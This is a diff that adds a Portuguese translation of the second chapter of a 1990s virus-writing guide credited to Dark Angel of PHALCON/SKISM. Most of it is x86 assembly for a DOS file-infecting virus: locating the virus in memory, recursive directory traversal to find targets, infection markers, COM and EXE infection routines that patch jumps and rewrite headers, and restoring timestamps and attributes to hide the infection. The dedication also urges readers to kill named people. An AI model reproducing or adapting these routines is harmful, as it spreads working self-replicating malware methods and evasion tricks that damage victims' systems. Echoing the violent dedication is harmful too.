@@ -1,0 +1,693 @@
+
+   ___________________________________________________________________
+  |                                                                   |
+  |   Curso de vírus - parte 2                                        |
+  |     Dark Angel's Phunky Virus Writing Guide                       |
+  |                                                                   |
+  |                                           traduzido por Dr Herman | 
+  |___________________________________________________________________|
+
+
+
+      //==//  //  //  /||      //      //====  //==//  //|   //      
+      //==//  //  //  /||      //      //====  //==//  //|   //
+     //  //  //  //  //||     //      //      //  //  //||  //
+    //==//  //==//  //=||    //      //      //  //  // || //
+   //      //  //  //  ||   //      //      //  //  //  ||//
+  //      //  //  //   ||  //====  //====  //==//  //   ||/
+  
+     /====   // //     //  /====   /|   /|
+    //      // //     //  //      //|  //|
+    ===\   // //     //   ===\   //|| //||
+      //  //  \\    //      //  // ||// ||
+  ====/  //    \\  //   ====/  //  ||/  ||
+  
+  -----------------------------------------------
+  DISCLAIMER: Finga que você viu um disclaimer 
+    aqui. 99.44% do código está garantido.
+  -----------------------------------------------
+  DEDICATÓRIA: por favor, faça o possível para
+    matar aqueles que tornaram isso possível,
+    especialmente aquela vaca muda que não sabe
+    o seu próprio nome (Patty), e seu amante
+    Ross M. Greenberg.
+  -----------------------------------------------
+  SAUDAÇÕES E ETC: saudações a todos os membros
+    da PHALCON/SKISM. Toneladas de agradecimentos
+    a Hellraiser, Garbageheap e Demogorgon. 
+    Nenhum agradecimento desta vez para Orion 
+    Rouge, o Deus Mestre da Idiotice.
+  -----------------------------------------------
+  
+  -------------------------
+  CAPÍTULO II: O REPLICADOR
+  -------------------------
+  
+  No último capítulo de meu Guia de Programação de Vírus, expliquei as
+  várias partes de um vírus e entrei numa breve discussão sobre cada
+  um. Neste número, dedicarei toda minha atenção a parte replicadora
+  do vírus. Prometi código e código apresentarei.
+  
+  Entretanto, devo parar um pouco para dizer que algumas "cópias
+  mutantes" da primeira lição foram distribuídas. Estas cópias não
+  contém a importantíssima seção que trata do cálculo de deslocamento.
+  
+  Você nunca saberá onde suas variáveis e código estarão na memória.
+  Se pensar um pouco, isso é bastante óbvio. Já que você está anexando 
+  um vírus no final de um programa, a localização em memória será
+  mudada, i.e., será maior devido ao programa infectado. Para 
+  compensar, devemos pegar a variação em deslocamento do vírus
+  original, ou deslocamento delta, e adicioná-lo a todas referências
+  de variáveis.
+
+  Instruções que utilizam deslocamento, i.e., endereçamento relativo,
+  não precisam ser alteradas. Estas instruções são o grupo JA, JB, JZ,
+  e JMP SHORT, JUMP label, e CALL. Assim, sempre que possível use estas
+  ao invés de, por exemplo, JUMP FAR PTR.
+  
+  Suponha que, nos exemplos seguintes, SI seja carregado com o
+  deslocamento (offset) delta.
+ 
+  Substitua
+    mov ax, contador
+  por
+    mov ax, word ptr [si + contador]
+  
+  Substitua
+    mov dx, deslocamento
+  por 
+    lea dx, [si+deslocamento]
+  
+  Você pode estar se perguntando, "Como é que eu vou encontrar este
+  deslocamento delta !?". É bem simples:
+
+    call setup
+
+  setup:
+    pop  si
+    sub  si, offset setup
+  
+
+  Uma explicação do fragmento acima: CALL setup empilha a localização
+  da próxima instrução, i.e., offset setup, na pilha. Depois, este
+  cálculo é retirado (pop'ado) em SI. Finalmente, o deslocamento 
+  ORIGINAL de setup (calculado em tempo de compilação) é subtraído de
+  SI, dando a você o deslocamento DELTA.
+  
+  No vírus original, o deslocamento DELTA será 0, i.e., a nova 
+  localização de setup é igual a velha localização de setup.
+
+  Sempre é preferível usar BP como seu deslocamento DELTA, já que SI é
+  usado em instruções de manipulação de strings. Use qual você
+  preferir. Eu irei usar uma ou outra de acordo com minha vontade.
+  
+  De volta ao assunto...
+  
+  Um vírus biológico é um "organismo" parasita que utiliza seu
+  hospedeiro para se espalhar. Deve manter o hospedeiro vivo para
+  manter-se "vivo" também.
+  
+  Apenas quando ele se espalhou o suficiente, o hospedeiro morre. Os
+  modernos vírus eletrônicos não são diferentes. Ele se anexa a um
+  sistema hospedeiro e se reproduz até que o sistema inteiro esteja
+  "fodido". Ele então prossegue ferrando o sistema do idiota que pegou
+  o vírus.
+  
+  Replicação é o que distingue um vírus de um simples "cavalo-de-tróia".
+  Todos podem escrever um "cavalo-de-tróia", mas um vírus é muito mais
+  elegante. Ele age de maneira quase invisível e pega a vítima de
+  surpresa quando finalmente mostra a cara. A primeira questão é - como
+  um vírus se espalha ? Tanto as infecções COM e EXE (exemplos de
+  rotinas de infecções abaixo) serão apresentadas.
+  
+  Existem duas maiores vertentes de vírus: runtime e TSR. Vírus runtime
+  infectam quando o programa é executado, enquanto vírus TSR tornam-se
+  residentes quando programas infectados são executados e então,
+  interceptam as interrupções e infectam os arquivos quando são
+  executados, abertos, fechados, e/ou quando terminam (i.e., INT 20h,
+  INT 21h/41h). Existem vantagens e desvantagens em cada uma das
+  vertentes. Vírus runtime são mais difíceis de serem detectados já que
+  não são mostrados em mapas de memória mas, por outro lado, o atraso
+  gerado quando eles procuram e infectam um arquivo podem desmascará-
+  los. Vírus TSR, se não codificados propriamente, podem ser facilmente
+  detectados por utilitários como MAPMEM, PMAP, etc, mas são geralmente
+  menores, já que não precisam de uma função para procurar arquivos
+  para infectar. Eles são mais rápidos que os vírus runtime, também
+  porque não precisam procurar arquivos para infectar. Devo cobrir os
+  vírus runtime aqui e os TSR numa próxima lição.  
+  
+  Eis um sumário da rotina de infecção:
+
+  +--------------------------------------------------------------+
+  |                                                              |
+  |  1. Encontre um arquivo para infectar.                       |
+  |  2. Verifique se ele atende aos critérios de infecção.       |
+  |  3. Verifique se ele já foi infectado, e em caso afirmativo  |
+  |     volte para o passo 1.                                    |
+  |  4. Caso contrário, infecte o arquivo.                       |
+  |  5. Limpe seus rastros.                                      |
+  |                                                              |
+  +--------------------------------------------------------------+
+   
+  Vou passar por cada um destes passos e apresentar códigos de exemplos
+  para cada um. Observe que apesar de um vírus completo poder ser feito
+  a partir da informação abaixo, você não pode simplesmente "copiar e
+  colar" os códigos e juntá-los, uma vez que os trechos são de vários
+  vírus diferentes que escrevi. Você deve estar familiarizado com 
+  assembly. Estou apresentando fragmentos de código -- o resto é com
+  você.
+
+  
+  --------------------------------------------
+  PASSO 1 - ENCONTRAR UM ARQUIVO PARA INFECTAR
+  --------------------------------------------
+
+  Antes de infectar um arquivo, você precisa encontrá-lo primeiro !
+  Isso pode ser um "gargalo" na performance do vírus, e deve ser
+  feito da maneira mais eficiente o possível. Para vírus "runtime",
+  existem poucas possibilidades. Você pode infectar arquivos apenas
+  no diretório atual, ou pode escrever uma rotina de "travessia de
+  diretórios" para infectar arquivos em TODOS os diretórios (apenas
+  alguns arquivos por execução, claro), ou você pode infectar arquivos
+  apenas em alguns diretórios. Por que você escolheria infectar apenas
+  arquivos no diretório atual ? Isso parece limitar a eficácia das
+  infecções. Mas isso é feito em alguns vírus para aumentar a 
+  performance ou para encurtar o código.
+
+  Eis uma função de travessia de diretórios. Ela usa recursão, e é
+  um pouco lenta, mas cumpre seu dever. Foi retirada com algumas
+  modificações do vírus "The Funky Bob Ross Vírus [Beta]"
+
+  
+  travessia proc near
+    push    bp                      ; cria a pilha (stack frame)
+    mov     bp, sp
+    sub     sp, 44                  ; aloca espaco para a DTA
+  
+    call    infecta_dir             ; chama as rotinas de busca e infecção
+      
+    mov     ah, 1Ah                 ; seta a DTA para o espaço
+    lea     dx, word ptr [bp-44]    ; alocado
+    int     21h                     
+  
+    mov     ah, 4Eh                 ; encontra o primeiro
+    mov     cx,16                   ; máscara de diretório
+    lea     dx,[si+offset mascara]  ; *.*
+    int     21h
+    jmp     short dirOK
+
+  agora:
+    cmp     byte ptr [bp-14], '.'   ; o primeiro caractere é '.' ?
+    je      short proximo           ; Se é, faz o loop novamente
+    lea     dx,word ptr [bp-14]     ; senão, carrega o nome do diretório
+    mov     ah,3Bh                  ; e o torna o diretório corrente
+    int     21h
+    jc      short proximo                ; se inválido, vai para o próximo
+    inc     word ptr [si+offset profund] ; profund++
+    call    near ptr travessia           ; diretório recursivo 
+
+ proximo:
+    lea     dx,word ptr [bp-44]     ; carrega o espaço alocado para DTA
+    mov     ah,1Ah                  ; e seta DTA com esta nova área
+    int     21h                     ; já que ele deve ter sido alterado
+
+    mov     ah,4Fh                  ; busca o próximo
+    int     21h
+
+  dirOK:
+    jnc     agora                           ; se OK, jmp elsewhere
+    cmp     word ptr [si+offset profund], 0 ; se o diretório é o raiz
+                                            ; (profund == 0)
+
+    jle     short limpeza                   ; então sai
+    dec     word ptr [si+offset profund]    ; senão diminui profund
+    lea     dx, [si+offset dirPai]          ; '..'
+    mov     ah,3Bh                          ; muda o diretório
+    int     21h                             ; para o anterior
+
+  limpeza:
+    mov     sp,bp
+    pop     bp
+    ret
+
+  travessia endp
+  
+  ; variáveis
+  profund   dw     0
+  dirPai    db     '..',0
+  mascara   db     '*.*',0
+
+
+  O código é auto-explicativo. Certifique-se de ter uma função chamada
+  infecta_dir que varra o diretório procurando possíveis arquivos
+  para infectar e certifique-se que ela não infecta arquivos já 
+  infectados. Esta função por sua vez, chama a função infecta_arq que
+  realmente infecta o arquivo.
+  
+  Observe, como já disse anteriormente, que isso é lento. Um método mais
+  rápido, mas não muito global, é o método "ponto ponto" (..). Hellraiser
+  me ensinou este pequeno truque. Basicamente, você continua procurando
+  arquivos num diretório e, se não encontrou, vai para o diretório
+  anterior (..) e tenta novamente, e assim vai. O código é simples.
+
+  
+  loopDir:
+    call    infecata_dir
+    lea     dx, [bp+pontoponto]
+    mov     ah, 3bh               ; muda o diretório (cd)
+    int     21h
+    jnc     loopDir               ; Carry é setado se estamos no raiz
+  
+  ; Variáveis
+  pontoponto  db   '..',0
+  
+
+  Agora você deve encontrar um arquivo para infectar. Isso é feito
+  (nos fragmentos abaixo) por uma função chamada infecta_dir. Esta
+  função chama achePrimeiro e acheProx algumas vezes para encontrar
+  arquivos para infectar. Você deve primeiro criar um novo DTA.
+  NUNCA use o DTA no PSP (em 80h) porque alterando isso, irá afetar
+  os parâmetros de linha de comando do programa infectado quando o
+  controle voltar para ele. Isso é facilmente feito com o seguinte:
+  
+    mov     ah, 1Ah                 ; seta DTA
+    lea     dx, [bp+offset DTA]     ; com a variável chamada DTA
+    int     21h
+  
+  Onde DTA é um trecho de 42-bytes de memória. Depois, faça uma série
+  de chamadas a achePrimeiro e acheProx:
+
+ 
+    mov     ah, 4Eh                 ; encontre o primeiro arquivo
+    mov     cx, 0007h               ; qualquer atributo
+    lea    dx, [bp+offset mascara]  ; DS:[DX] --> máscara de arquivo
+    int     21h
+    jc      naoAchei
+
+  acheOutro:
+    call    verificaInfeccao
+    mov     ah, 4Fh                 ; encontre o próximo arquivo
+    int     21h
+    jnc     acheOutro
+
+  naoAchei:
+
+  
+  Onde mascara é DB'ado para '*.EXE',0 ou '*.COM',0. Você também 
+  poderia chamar achePrimeiro para '*.*',0 e checar se a extensão é
+  EXE ou COM.
+
+  
+  ------------------------------
+  PASSO 2 - CRITÉRIO DE INFECÇÃO
+  ------------------------------
+  
+  Seu vírus deve ser justo em suas infecções. Por exemplo, você pode
+  não querer infectar o COMMAND.COM, já que alguns programas (i.e.
+  FluShot+) verifica sua CRC ou checksum em tempo de execução (runtime).
+  Talvez você não queira infectar o primeiro arquivo válido num
+  diretório. "Ambulance Car" é um exemplo de tal vírus. Bom, não
+  importa se existe algum critério de infecção, você deve checar por
+  isso agora. Eis um exemplo da checagem se as últimas duas letras são
+  'ND', uma simples verificação para COMMAND.COM:
+    
+    cmp     word ptr [bp+offset DTA+35], 'DN'  ; ordem de palavra inversa
+    jz      falhou
+  
+
+  -------------------------------------
+  PASSO 3 - VERIFICAR INFECÇÃO ANTERIOR
+  -------------------------------------
+  
+  Todo vírus possui certas características para as quais você pode
+  identificar se um arquivo já está infectado. Por exemplo, um certo
+  pedaço de código pode aparecer num local. Ou talvez, a instrução JMP
+  esteja sempre codificada de uma certa maneira. Não importa, você deve
+  ter certeza que seu vírus possua uma 'marca' para que não ocorram
+  múltiplas infecções num arquivo. Eis um exemplo de tal verificação
+  (para um infector de arquivos COM):
+  
+    mov     ah,3Fh                          ; colocar os 3 primeiros 
+    mov     cx, 3                           ; bytes do arquivo
+    lea     dx, [bp+offset buffer]          ; no buffer
+    int     21h
+  
+    mov     ax, 4202h                       ; procurar por EOF
+    xor     cx, cx                          ; DX:CX = deslocamento
+    xor     dx, dx                          ; retorna o tamanho do arquivo
+    int     21h                             ; em DX:AX
+  
+    sub     ax, tamanhoVirus + 3
+    cmp     word ptr [bp+offset buffer+1], ax
+    jnz     infectar
+  
+  descarta:
+    mov     ah, 3Eh                         ; senão, fecha o arquivo
+    int     21h                             ; e vai procurar outro
+
+  
+  Neste exemplo, BX é o 'handle' (identificador de arquivo) do programa
+  que será verificado e tamanhoVirus é o tamanho do vírus (dãããããããã).
+  buffer é uma área de 3 bytes. Este fragmento de código lê os 3
+  primeiros bytes e coloca nos buffer e então compara a localização do
+  JMP (localizado na palavra começando em buffer+1) com o tamanho do
+  arquivo. Se o JMP aponta para 'tamanhoVirus' bytes antes de EOF, então
+  o arquivo já está infectado com este vírus. Um outro método seria
+  procurar em uma certa localização no arquivo por um determinado byte
+  ou palavra. Por exemplo:
+  
+    mov     ah, 3Fh                         ; lê os primeiros quatro
+    mov     cx, 4                           ; bytes do arquivo e os
+    lea     dx, [bp+offset buffer]          ; coloca no buffer.
+    int     21h
+  
+    cmp     byte ptr [buffer+3], id_infeccao ; verifica o quarto 
+    jz      bomb_out                         ; byte 
+
+  infectar:
+  
+
+  ----------------------------
+  PASSO 4 - INFECTAR O ARQUIVO
+  ----------------------------
+
+  Estas são as tripas do vírus, o coração do replicador. Uma vez
+  localizado um arquivo potencial, você deve salvar os atributos, data,
+  hora e tamanho para usar mais tarde. O que segue é a dissecação do DTA:
+  
+  +---------+-----------+-------------------------------------------------+
+  | desloc  |  tamanho  |  O que é                                        |
+  +---------+-----------+-------------------------------------------------+
+  |    0h   |  21 BYTES |  reservado, varia de acordo com a versão do DOS | 
+  |   15h   |  BYTE     |  atributo do arquivo                            | 
+  |   16h   |  WORD     |  hora do arquivo                                |
+  |   18h   |  WORD     |  data do arquivo                                |
+  |   1Ah   |  DWORD    |  tamanho do arquivo                             |
+  |   1Eh   |  13 BYTES |  arquivo + extensão em ASCII                    |
+  +---------+-----------+-------------------------------------------------+
+  
+  Como pode ver, DTA armazena toda a informação vital sobre o arquivo
+  que você precisa. O seguinte fragmento de código é um exemplo de como
+  salvar a informação:
+
+    lea  si, [bp+offset DTA+15h]      ; começa com os atributos
+    mov  cx, 9                        ; termina com o tamanho do arquivo
+    lea  di, [bp+offset arq_atrib]    ; move para suas localizações
+    rep  movsb
+
+  ; variáveis necessárias
+  arq_atrib    db   ?
+  arq_hora     dw   ?
+  arq_data     dw   ?
+  arq_tamanho  dd   ?
+
+  Agora você pode mudar os atributos do arquivo para nada através da
+  INT 21h/função 43h/sub-função 01h. Isto é feito para permitir a
+  infecção de arquivos ocultos, do sistema, e apenas para leitura.
+  Apenas vírus primitivos (e mínimalistas) não tratam estes arquivos.
+   
+    lea  dx, [bp+offset DTA+1eh]            ; DX aponta para o nome do 
+    mov  ax, 4301h                          ; arquivo em DTA
+    xor  cx, cx                             ; limpa os atributos do arquivo
+    int  21h                                ; faz a chamada
+          
+  Uma vez que os atributos forem aniquilados, você pode abrir o arquivo
+  impunemente. Use um 'handle' aberto em modo leitura/escrita.
+  
+    lea  dx, [bp+offset DTA+1eh]   ; usar o nome do arquivo em DTA
+    mov  ax, 3d02h                 ; abre no modo de leitura/escrita
+    int  21h                       ; dããã...
+    xchg ax, bx                    ; o ponteiro de arquivo é mais útil em BX
+          
+  
+  Eis a parte que você estava esperando: a rotina de infecção. Tenho o
+  prazer de apresentar código que irá infectar arquivos COM. "Ei, você
+  já mostrou isso na lição anterior" - você pode estar dizendo. Ah, mas
+  tem mais, muito mais. Um exemplo de infector de arquivo EXE também
+  será apresentado.
+  
+  A teoria por trás da infecção de um arquivo COM foi coberta na última
+  lição, e eu não vou em envolver em detalhes novamente. Eis um exemplo:
+  
+  ; Exemplo de um infectador COM.  Assuma que BX possui o ponteiro do arquivo
+  ; Assuma que o arquivo COM passe pelo critério de infecção e não esteja infectado
+ 
+    mov     ah, 3fh
+    lea     dx, [bp+buffer1]
+    mov     cx, 3
+    int     21h
+  
+    mov     ax, 4200h                       ; mova o ponteiro do arquivo para
+    xor     cx, cx                          ; o início do arquivo
+    xor     dx, dx                          
+    int     21h
+ 
+    mov     byte ptr [bp+buffer2], 0e9h      ; JMP
+    mov     ax, word ptr [bp+arq_tamanho]
+    sub     ax, tamanho_p1                   ; geralmente 3
+    mov     word ptr [bp+buffer2+1], ax      ; deslocamentos de JMP
+  
+  ; codifica a instrução JMP para o ínicio do arquivo
+  
+    mov     byte ptr [bp+buffer2], 0e9h      ; JMP
+    mov     ax, word ptr [bp+arq_tamanho]
+    sub     ax, tamanho_p1                   ; geralmente 3
+    mov     word ptr [bp+buffer2+1], ax      ; deslocamentos de JMP
+  
+  ; escreve a instrução JMP no ínicio do arquivo
+  
+    mov     ah, 40h                          ; grava CX bytes no
+    mov     cx, 3                            ; ponteiro em BX a partir do
+    lea     dx, [bp+buffer2]                 ; buffer -> DS:[DX]
+    int     21h
+  
+    mov     ax, 4202h                        ; move o ponteiro
+    xor     cx, cx                           ; para o fim do arquivo
+    xor     dx, dx
+    int     21h
+  
+    mov     ah, 40h                     ; grava CX bytes
+    mov     cx, fimVirus - inicio_p2    ; tamanho efetivo do vírus
+    lea     dx, [bp+inicio_p2]          ; começa a gravar do começo
+    int     21h
+  
+  ; variáveis
+  buffer1 db 3 dup (?)                             ; bytes salvos do arquivo infectado
+                                                   ; utilizados para restaurá-lo
+                                                   ; mais tarde
+  buffer2 db 3 dup (?)                             ; buffer temporário
+
+
+  Após algum exame, este código provará ser fácil de entender. Ele 
+  começa lendo os três primeiros bytes em um buffer. Observe que você
+  poderia ter feito isso num passo anterior, como quando verificava por
+  uma infecção prévia.
+  
+  Se você já fez isso, obviamente não precisa fazer de novo. Este 
+  buffer deve estar armazenado no vírus para que possa ser restaurado
+  mais tarde quando o código for executado.
+
+  Infecções EXE são simples também, entretanto um pouco mais difícil de
+  entender. Primeiro, a teoria. Eis o formato do cabeçalho (header) de
+  arquivo EXE:
+
+  +--------+--------------------------+-----------+------------------------------+
+  | Desloc | Nome                     | Tamanho   | Comentários                  |
+  +--------+--------------------------+-----------+------------------------------+
+  |   00   | Assinatura               | 2 bytes   | sempre 4Dh 5Ah(MZ)           |
+  |  *02   | Tamanho da última página | 1 palavra | número de bytes na última    |
+  |        |                          |           | página                       |
+  |  *04   | Páginas do arquivo       | 1 palavra | número de páginas de 512     |
+  |        |                          |           | bytes                        |
+  |   06   | Itens reloc              | 1 palavra | número de entradas na tabela |
+  |   08   | Cabeçalhos paras         | 1 palavra | tamanho do cabeçalho em 16   |  
+  |        |                          |           | bytes parágrafos             |
+  |   0A   | MinAlloc                 | 1 palavra | mínimo de memória necessária |
+  |        |                          |           |                em parágrafos |
+  |   0C   | MaxAlloc                 | 1 palavra | máximo de memória necessária |
+  |        |                          |           |                em parágrafos |
+  |  *0E   | PreReloc SS              | 1 palavra | deslocamento em paras para o |
+  |        |                          |           |                 seg de pilha |
+  |  *10   | SP inicial               | 1 palavra | valor inicial de SP          |
+  |   12   | Checksum negativo        | 1 palavra | atualmente ignorado          | 
+  |  *14   | Pre Reloc IP             | 1 palavra | início do end. de execução   |
+  |  *16   | Pre Reloc CS             | 1 palavra | segmento inicial pré-ajustado| 
+  |   18   | Desloc. da tabela Reloc  | 1 palavra | é o deslocamento em relação  |
+  |        |                          |           | ao  início do arquivo        |
+  |   1A   | Número de overlay        | 1 palavra | ignorado se não for overlay  |
+  |   1C   | Reservado/sem uso        | 2 palavras|                              |  
+  +--------+--------------------------+-----------+------------------------------+
+
+    * indica byte que pode ser alterado pelo vírus
+  
+  Para entender isso, você primeiro deve imaginar que arquivo EXE estão
+  estruturados em segmentos. Estes segmentos podem começar e terminar
+  em qualquer lugar. Tudo que é preciso fazer para infectar um arquivo
+  EXE é adicionar seu código no final. Ele estará no seu próprio
+  segmento. Agora, tudo que você tem a fazer é que o código do seu
+  vírus seja executado antes do programa. Ao contrário das infecções
+  COM, nenhum código de programa é sobrescrito, entretanto o cabeçalho
+  é modificado. Observe que o vírus ainda pode ter a estrutura V1/V2,
+  mas apenas V2 precisa ser concatenado no final do arquivo EXE.
+  
+  O deslocamento 4 (páginas de arquivo) contém o tamanho do arquivo
+  dividido por 512, arredondado para cima. O deslocamento 2 guarda o
+  tamanho do arquivo módulo 512 (o resto da divisão). O deslocamento
+  OEh guarda o deslocamento do parágrafo do início do segmento de pilha
+  (relativo ao final do cabeçalho) e o deslocamento 10h guarda o
+  deslocamento do ponteiro de pilha (relativo ao ínicio do segmento de
+  pilha). O deslocamento 16h guarda o deslocamento do parágrafo do
+  ponto de entrada relativo ao final do cabeçalho e o deslocamento 14h
+  guarda o deslocamento do ponto de entrada em relação ao segmento de
+  entrada. Os deslocamentos 14h e 16h são chaves para se adicionar o
+  código inicial (o vírus) ao arquivo.
+
+  Antes de infectar um arquivo, você deve salvar CS:IP e SS:SP 
+  encontrados no cabeçalho EXE, uma vez que você vai precisar deles
+  durante a execução. Note que SS:SP não está armazenado no formato
+  "dupla-palavra-inversa" da Intel. Se você não sabe sobre o que estou
+  falando, não se preocupe; isso é apenas para pessoas que manjam.
+  Você também deve salvar o tamanho do arquivo já que vai precisar usar
+  este valor várias vezes durante a rotina de infecção. 
+  
+  Agora, é a hora de calcular alguns deslocamentos ! Para encontrar o
+  novo CS:IP e SS:SP, use o seguinte código. Ele assume que o tamanho
+  do arquivo está carregado em DX:AX.
+
+  
+    mov     bx, word ptr [bp+cabecalhoEXE+8]    ; o tamanho do cabeçalho em parágrafos
+             ;  ^--- certifique-se de não destruir o ponteiro de arquivo
+    mov     cl, 4         ; multiplica por 16
+    shl     bx, cl        ; não funcionará com cabeçalhos > 4096 bytes  
+    sub     ax, bx        ; subtrai o tamanho do cabeçalho do tamanho
+    sbb     dx, 0         ;  do arquivo
+
+  ; agora DX:AX está carregado com o tamanho do arquivo menos o tamanho do cabeçalho
+    mov     cx, 10h                        ; DX:AX/CX = AX resto DX
+    div     cx
+
+  
+  Este código é bem ineficaz. Provavelmente seria mais fácil dividir
+  por 16 primeiro e depois fazer uma subtração com AX, mas isso é coisa
+  do código que escolhi. A vida é assim... Entretanto, este código não
+  tem vantagens sobre um mais eficiente. Com isso, você se certifica
+  que o IP (em DX) será menor que 15. Isso permite a pilha estar no
+  mesmo segmento do ponto de entrada, já que o ponteiro da pilha é um
+  número maior.
+
+  Agora, AX*16+DX aponta para o final do código. Se o vírus começa
+  imediatamente após o final do código, AX e DX podem ser usados como
+  CS e IP iniciais, respectivamente. Entretanto, se o vírus tiver algum
+  lixo (código ou dados) antes do ponto de entrada, some o deslocamento
+  do ponto de entrada com DX (sem ADC com AX é necessário já que DX
+  sempre será pequeno).
+  
+    mov     word ptr [bp+cabecalhoEXE+14h], dx  ; deslocamento IP
+    mov     word ptr [bp+cabecalhoEXE+16h], ax  ; deslocamento CS no módulo
+          
+  SP e SS agora já podem ser calculados. SS é igual a CS. O valor
+  verdadeiro de SP é irrelevante, já que ele é grande o suficiente
+  para a pilha não invadir a área de código (lembre-se: a pilha
+  cresce de cima para baixo).
+  
+  Como regra geral, certifique-se que SP é ao menos 100 bytes maior que
+  o tamanho do vírus. Isso deve ser suficiente para evitar problemas.
+  
+    mov     word ptr [bp+cabecalhoEXE+0Eh], ax  ; deslocamento do parágrafo SS
+    mov     word ptr [bp+cabecalhoEXE+10h], 0A000h ; SP inicial
+  
+  Tudo que resta to fiddle in no cabeçalho é do mesmo tamanho. Restaure
+  o tamanho original do arquivo a partir de onde você salvou para DX:AX.
+  Para calcular AX:AX/512 e DX:AX MOD 512, use o código abaixo:
+      
+    mov     cl, 9                           ; Usa shift novamente para
+    ror     dx, cl                          ; divisão
+    push    ax                              ; Precisa usar AX novamente
+    shr     ax, cl
+    adc     dx, ax                          ; páginas em dx     
+    pop     ax
+    and     ah, 1                           ; mod 512 em ax
+  
+    mov     word ptr [bp+cabecalhoEXE+4], dx  ; Restaura o tamanho do 
+    mov     word ptr [bp+cabecalhoEXE+2], ax  ; arquivo no cabeçalho EXE
+  
+
+  O que sobrou foi reescrever o cabeçalho EXE e concatenar o vírus no
+  final do arquivo. Deseja código ? Você tem código.
+  
+    mov     ah, 3fh                         ; BX tem o ponteiro
+    mov     cx, 18h                         ; Não precisamos do cabeçalho inteiro
+    lea     dx, [bp+ExeHead]
+    int     21h
+  
+    call    infectaEXE
+  
+    mov     ax, 4200h                ; volta ao início do
+    xor     cx, cx                   ; arquivo
+    xor     dx, dx
+    int     21h
+  
+    mov     ah, 40h                  ;  escreve o cabeçalho de volta
+    mov     cx, 18h
+    lea     dx, [bp+cabecalhoEXE]
+    int     21h
+ 
+    mov     ax, 4202h                       ; vai para o fim do arquivo
+    xor     cx, cx
+    xor     dx, dx
+    int     21h
+  
+    mov     ah, 40h                   ; OBS: precisamos escrever apenas
+    mov     cx, part2size             ;      a parte 2 do vírus
+    lea     dx, [bp+offset inicioP2]  ;      (partes de vírus
+    int     21h                       ;       definidas na primeira
+                                      ;       lição deste guia)
+
+  
+  Observe que este código sozinho não é suficiente para escrever um
+  infecatdor COM ou EXE. É necessário também para transferir o controle
+  de volta ao programa hospedeiro. A informação necessária para fazer
+  isso deve estar na próxima lição. Enquanto isto, você pode tentar
+  fazer isso sozinho; lembre-se que você deve restaurar tudo que você
+  alterou.
+
+    
+  ----------------------------
+  PASSO 5 - LIMPE SEUS RASTROS
+  ----------------------------
+
+  Este passo tão simples, é muito esquecido. É extremamente importante,
+  já que um usuário alerta notará a presença do vírus a qualquer
+  atualização desnecessária de um arquivo. Na sua forma simples, ele
+  envolve a restauração dos atributos de arquivos, data e hora. Isso é
+  feito com o seguinte código:
+
+  
+    mov     ax, 5701h                    ; seta a data e hora do arquivo
+    mov     dx, word ptr [bp+arq_data]     ; DX = data
+    mov     cx, word ptr [bp+arq_hora]     ; CX = hora
+    int     21h
+  
+    mov     ah, 3eh                      ; fechamento do arquivo
+    int     21h
+  
+    mov     ax, 4301h                    ; Seta os atributos
+    lea     dx, [bp+offset DTA + 1Eh]    ; nome do arquivo continua em DTA
+    xor     ch, ch
+    mov     cl, byte ptr [bp+arq_atrib]  ; atributos em CX
+    int     21h
+          
+  
+  Lembre-se também de restaurar o diretório se ele muda durante a
+  execução do vírus.
+
+  
+  ----------------
+  O QUE VEM POR AÍ
+  ----------------
+  
+  Tenho recebido uma quantidade enorme de mensagens pelo último
+  capítulo deste guia. No próximo, devo cobrir o resto do vírus assim
+  como várias dicas e truques de programação de vírus. Até lá, dê uma
+  olhada na 40Hex, a revista oficial de PHALCON/SKISM, onde
+  compartilhamos dicas e informações pertinentes a comunidade virótica.
